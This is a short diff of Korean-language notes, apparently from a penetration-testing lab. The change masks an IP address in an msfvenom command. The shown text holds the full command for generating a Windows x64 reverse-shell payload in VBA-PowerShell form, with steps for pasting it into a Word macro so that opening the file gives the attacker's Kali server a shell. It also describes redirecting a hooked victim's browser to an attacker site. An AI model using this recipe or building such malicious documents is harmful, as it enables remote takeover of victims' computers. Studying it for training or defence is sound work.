@@ -12,7 +12,7 @@ Details에서 사용자 컴퓨터의 다양한 정보들을 얻을 수 있음
 Commands =>Redirect Broswer 에 원하는 사이트 입력 후 Execute를 누르면 공격자 사이트로 이동함.
 
 [악성스크립트]
-msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.0.103 LPORT=7777 -f vba-psh > res.txt
+msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.0.xxx LPORT=7777 -f vba-psh > res.txt
 악성코드 생성 & res.txt에 저장
 이 후 이 코드를 워드파일 매크로에 붙여넣기 하고 저장하면 뒤에 워드파일을 열 때 마다 악성코드가 실행된다. 이를 통해 공격자서버(kali)에서
 windows의 Shell을 얻게되어 공격이 가능해진다.
